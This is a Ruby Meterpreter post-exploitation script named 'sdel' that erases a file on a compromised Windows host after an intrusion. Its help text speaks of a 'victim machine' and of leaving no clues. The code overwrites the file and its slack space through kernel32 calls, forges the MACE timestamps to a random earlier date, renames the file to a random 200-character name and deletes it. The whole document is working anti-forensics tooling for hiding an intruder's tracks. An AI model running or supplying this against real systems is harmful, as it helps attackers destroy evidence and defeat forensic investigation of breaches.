# $Id$
# $Revision$
#
# Meterpreter script that overwrite the file contents when it's deleted
# Author: Borja Merino at bmerinofe[at]gmail.com
#-------------------------------------------------------------------------------

session = client
file = nil
type = 1

# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false, "Help menu." ],
	"-f"  => [ true,  "File to be deleted." ],
	"-z"  => [ false, "Zero overwrite. If not specified, random overwrite will be used"]
)
def usage
	print_line("Safe Delete Meterpreter Script")
	print_line("The goal of the script is to hinder the recovery of deleted files by overwriting its contents.")
	print_line("This could be useful when you need to download some file on the victim machine and then delete it")
	print_line("without leaving clues about its contents. Note that the script does not wipe the free disk space")
	print_line("so temporary/sparse/encrypted/compressed files could not be overwritten. Note too that MTF entries")
	print_line("are not overwritten so very small files could stay resident within the stream descriptor.")
	print_line("Be aware that overwriting process is a time-consuming task; use it wisely.\n")
	print_line("Usage:" + @@exec_opts.usage)
	print_line("Example:\n")
	print_line("run sdel -f file.log")
	print_line("run sdel -z -f troj.exe\n")
	raise Rex::Script::Completed
end


#Function to calculate the size of the cluster
def size_cluster()
	begin
		drive =  client.fs.file.expand_path("%SystemDrive%")
		r = client.railgun.kernel32.GetDiskFreeSpaceA(drive,4,4,4,4)
		cluster = r["lpBytesPerSector"] * r["lpSectorsPerCluster"]
		print_status("Cluster Size: #{cluster}")

		return cluster
	end
end


#Function to calculate the real file size on disk (file size + slack space)
def size_on_disk(file)
	begin
		size_file = client.fs.file.stat(file).size;
		print_status("Size of the file: #{size_file}")

		if (size_file<800)
			print_status("The file is too small. If it's store in the MTF (NTFS) sdel will not overwrite it")
		end

		sizeC= size_cluster()
		size_ = size_file.divmod(sizeC)

		if size_.last != 0
			real_size = (size_.first * sizeC) + sizeC
		else
			real_size = size_.first * sizeC
		end

		print_status("Size on disk: #{real_size}")
		return real_size
	end
end


#Change MACE attributes. Get a fake date by subtracting N days from the current date
def change_mace(file)
	begin
		rsec=  Rex::Text.rand_text_numeric(7,bad='012')
		date = Time.now - rsec.to_i
		print_status("Changing MACE attributes")
		client.priv.fs.set_file_mace(file, date,date,date,date)
	end
end


#Function to overwrite the file
def file_overwrite(session,file,type)
	begin
		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
		r = client.railgun.kernel32.CreateFileA(file, "GENERIC_WRITE", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING", "FILE_FLAG_WRITE_THROUGH", 0)
		handle=r['return']
		real_size=size_on_disk(file)

		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365541(v=vs.85).aspx
		client.railgun.kernel32.SetFilePointer(handle,0,nil,"FILE_BEGIN")

		if type==0
			random="\0"*real_size
		else
			random=Rex::Text.rand_text(real_size,nil)
		end

		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
		w=client.railgun.kernel32.WriteFile(handle,random,real_size,4,nil)

		if w['return']==false
			raise "The was an error writing to disk, check permissions"
		end

		print_status("#{w['lpNumberOfBytesWritten']} bytes overwritten")
		client.railgun.kernel32.CloseHandle(handle)

		change_mace(file)

		#Generate a long random file name before delete it
		newname = Rex::Text.rand_text_alpha(200,nil)
		print_status("Changing file name")

		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa365239(v=vs.85).aspx
		client.railgun.kernel32.MoveFileA(file,newname)

		client.fs.file.rm(newname)
		print_good("File erased!")
	end
end


#Check if the file is encrypted or compressed
def comp_encr(file)
	begin
		#http://msdn.microsoft.com/en-us/library/windows/desktop/aa364944(v=vs.85).aspx
		handle=client.railgun.kernel32.GetFileAttributesA(file)
		type= handle['return']

		#FILE_ATTRIBUTE_COMPRESSED=0x800
		#FILE_ATTRIBUTE_ENCRYPTED=0x4000
		if ( type & (0x4800)).nonzero?
			return true
		end
		return false
	end
end


if client.platform =~ /win32|win64/
	@@exec_opts.parse(args) { |opt, idx, val|
		case opt
		when "-z"
			type=0
			print_status("The file will be overwritten with null bytes")
		when "-f"
			stat = client.fs.file.stat(val)
			if !(stat.file?)
				raise "File #{val} is not a file"
			elsif  comp_encr(val)
				print_status("File compress or encrypted. Content could not be overwritten")
			end

			file_overwrite(session,val,type)
		when "-h"
			usage
		end
	}
	if args.length == 0
		usage
	end
else
	print_error("This version of Meterpreter is not supported with this script!")
	raise Rex::Script::Completed
end
